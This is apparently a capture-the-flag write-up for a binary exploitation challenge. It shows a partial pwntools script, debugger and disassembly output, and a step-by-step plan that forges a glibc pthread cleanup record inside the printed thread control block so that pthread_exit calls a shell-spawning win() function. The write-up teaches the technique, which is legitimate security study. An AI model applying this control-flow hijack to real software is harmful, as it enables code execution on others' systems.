_In case you didn't know, the p in pthread stands for pawsix!_

A PWN challenge involving thread control block (TCB) manipulation.

## Files Provided

- `pawsix_thread` (binary)
- `pawsix_thread.c` (source)
- `dockerfile`

## Checksec

- **Canary:** FOUND (stack corruption detection enabled)
- **CFI:** SHSTK and IBT
- **NX:** Enabled (code pages are not writable)
- **PIE:** Enabled (base address is randomized)
- **RELRO:** Full RELRO
- **RPATH:** No RPATH
- **RUNPATH:** No RUNPATH
- **SafeStack:** Not Found
- **Separate code:** Enabled
- **Stack Clash:** No Probes
- **Symbols:** 50 Symbols

## The Code

`TSIZE` (Thread size) is defined as `0x948`. The original output is 4736 hex characters long.

## First Run

The program prints `my pthread:` followed by a large hex dump, then prompts `Now, give me your pthread`. The user input is expected to be thread control block data that gets processed afterwards.

Inputting 300 A's:
```
Process 9241, './pawsix_thread' from job 1, 'python3 -c "print('A'*300)" | ...' terminated by signal SIGSEGV (Address boundary error)
```

Using pwndbg with cyclic junk to find the crash offset: RAX is returning cyclic junk `RAX 0x6161616661616165 ('eaaafaaa')`. Since the return address is 8 bytes, it can be overwritten with an arbitrary value.

To verify the offset with a fixed payload:

```
0000000000000000deadbeef
```

Validated that RAX now returns to `deadbeef`:
```
RAX 0x6665656264616564 ('deadbeef')
```

Examining the registers during execution:
```
0x7ffff7c994ba <pthread_exit+42> lea rcx, [rax + 0x308 ] RCX => 0x666565626461686c ('lhadbeef')
```

The origin of these extra bytes was not immediately clear.

Decided to replace `deadbeef` with a malicious memory address. Looking at `nm` output:
```
00000000000012a3 T thread_func
```

Since PIE is enabled, I tried to program this dynamically with pwntools:

```py
from pwn import *

context.arch = 'amd64'

exe = ELF('./pawsix_thread')
p = process([exe.path])

OFFSET = 16
target = exe.symbols['thread_func']
log.info(f"pthread_create @ {hex(target)}")
payload = b'a' * OFFSET + p64(target)

p.recvuntil(b'Now, give me your pthread:')
p.sendline(payload)

print(p.recvall(timeout=5).decode(errors='replace'))
```

This approach didn't work. However, the binary symbol table includes a `win()` function.

## What are we actually trying to achieve? _ft reading the code again_

The `win()` function spawns `/bin/sh`, providing shell access. However, `thread_func()` does not reference its arguments, suggesting `win()` is not intended to be executed as a thread callback. The goal is to call `win()` directly by manipulating the thread control block, which is read and processed after user input is received.

## What I Missed

The program prints the Thread Control Block, then allows it to be overwritten via stdin. The `pthread_exit()` function reads several fields from the TCB to determine the shutdown sequence.

When `pthread_exit()` is called:
- It saves the exit status
- Updates the thread state (done)
- Calls `__pthread_unwind()` to run cleanup handlers
- Exits the thread

The cleanup handlers are a linked list of functions that registered to run on exit, used by libraries to clean up resources when a thread dies.

Looking at the disassembly of `pthread_exit()`:

```
pwndbg> disassemble pthread_exit
Dump of assembler code for function __GI___pthread_exit:
   0x00007ffff7c99490 <+0>:     endbr64
   0x00007ffff7c99494 <+4>:     push   rbp
   0x00007ffff7c99495 <+5>:     mov    rbp,rsp
   0x00007ffff7c99498 <+8>:     push   rbx
   0x00007ffff7c99499 <+9>:     mov    rbx,rdi
   0x00007ffff7c9949c <+12>:    sub    rsp,0x8
   0x00007ffff7c994a0 <+16>:    call   0x7ffff7d1ff10 <__GI___libc_unwind_link_get>
   0x00007ffff7c994a5 <+21>:    test   rax,rax
   0x00007ffff7c994a8 <+24>:    je     0x7ffff7c994e7 <__GI___pthread_exit+87>
   0x00007ffff7c994aa <+26>:    mov    rax,QWORD PTR fs:0x10
   0x00007ffff7c994b3 <+35>:    mov    QWORD PTR [rax+0x630],rbx
   0x00007ffff7c994ba <+42>:    lea    rcx,[rax+0x308]
   0x00007ffff7c994c1 <+49>:    mov    eax,DWORD PTR [rax+0x308]
   0x00007ffff7c994c7 <+55>:    mov    edx,eax
   0x00007ffff7c994c9 <+57>:    and    edx,0xfffffffd
   0x00007ffff7c994cc <+60>:    or     edx,0x11
   0x00007ffff7c994cf <+63>:    cmp    eax,edx
   0x00007ffff7c994d1 <+65>:    je     0x7ffff7c994d9 <__GI___pthread_exit+73>
   0x00007ffff7c994d3 <+67>:    lock cmpxchg DWORD PTR [rcx],edx
   0x00007ffff7c994d7 <+71>:    jne    0x7ffff7c994c7 <__GI___pthread_exit+55>
   0x00007ffff7c994d9 <+73>:    mov    rdi,QWORD PTR fs:0x300
   0x00007ffff7c994e2 <+82>:    call   0x7ffff7ca1090 <__GI___pthread_unwind>
   0x00007ffff7c994e7 <+87>:    lea    rdi,[rip+0x125c82]        # 0x7ffff7dbf170
   0x00007ffff7c994ee <+94>:    call   0x7ffff7c8cfa0 <__GI___libc_fatal>
```

Key line: `mov rdi,QWORD PTR fs:0x300` followed by `call 0x7ffff7ca1090 <__GI___pthread_unwind>`, but this is NOT where the cleanup routine gets called. The 0x300 field is `cleanup_jmp_buf`, which gets passed to `__pthread_unwind`.

To trace from here to the actual call: when you see a `call <function>`, that function is your next destination. Disassemble it:

```
pwndbg> disassemble 0x7ffff7ca1090
```

Inside `__pthread_unwind`, the field isn't dereferenced either. Instead, it calls `_Unwind_ForcedUnwind` with a callback function (`unwind_stop`) as an argument. The callback is where the actual work happens. Disassemble that callback:

```
pwndbg> disassemble unwind_stop
```

Now you find where it actually matters:

```
   0x00007ffff7ca0f06 <+38>:    mov    rdx,QWORD PTR fs:0x2f8    ← cleanup chain pointer
   ...
   0x00007ffff7ca0fd3 <+243>:   mov    r14,QWORD PTR [rdx+0x18]  ← __prev
   0x00007ffff7ca0fd7 <+247>:   mov    rdi,QWORD PTR [rdx+0x8]   ← __arg
   0x00007ffff7ca0fdb <+251>:   call   QWORD PTR [rdx]           ← __routine() called here
```

The actual callable cleanup chain is at `fs:0x2f8` (not 0x300), where the function pointer at `rdx+0x00` is dereferenced and called directly.

### The Attack

1. Overwrite TCB+0x2f8 to point to a location inside the TCB (somewhere unused)
2. Forge a `pthread_cleanup_buffer` structure at that location
3. Set `__routine` to the address of `win()` and `__arg` to 0
4. When `pthread_exit()` runs, `unwind_stop` reads `fs:0x2f8`, finds your forged structure, and calls `win()`

Note: the 0x2f8 offset is specific to glibc version. Always verify by disassembling `unwind_stop` and looking for the `mov %fs:0xNNN,%rdx` followed by `call *(%rdx)` pair.

### The Memory Leak

The printed TCB already gives us the memory address of `win()` at TCB+0x648, and `thread_func` at TCB+0x640.

### Building the Exploit

1. Read the TCB hex dump that's printed, find `thread_func` and `win()` addresses
2. Use the known offset to calculate PIE base: `PIE_base = leaked_thread_func_addr - 0x12a3`
3. Copy the entire TCB dump into a `bytearray` to modify it (preserves bytes you don't touch)
4. In a blank area of the dump (e.g., offset 0x420):
   - Set `+0x00: __routine` to address of `win()`
   - Set `+0x08: __arg` to 0
   - Set `+0x10: __canceltype` to 0
   - Set `+0x18: __prev` to NULL (end of list)
5. Patch the cleanup chain pointer at TCB+0x2f8 to point to your forged structure
6. Send the modified TCB via stdin with `p.send(tcb)` (not `sendline()`, needs exactly 0x948 bytes)

## Lessons Learned

- The PIE base can be calculated by using `nm` on the executable to find the offset of a function whose memory address we can leak, then subtracting that static offset. Example: `0x5555555552a3 - 0x12a3 = PIE_base`
- Use `disassemble` in pwndbg to examine functions more closely. Follow the call chain to find where a field is actually used, not just referenced:
  - `pthread_exit` loads `fs:0x300` and calls `__pthread_unwind`, but that's not where the cleanup routine is called
  - Disassemble `unwind_stop` to find where `fs:0x2f8` is loaded and dereferenced with `call *(%rdx)`
- Forging data structures that library code will traverse and use is a powerful technique when you control the memory and understand the traversal logic
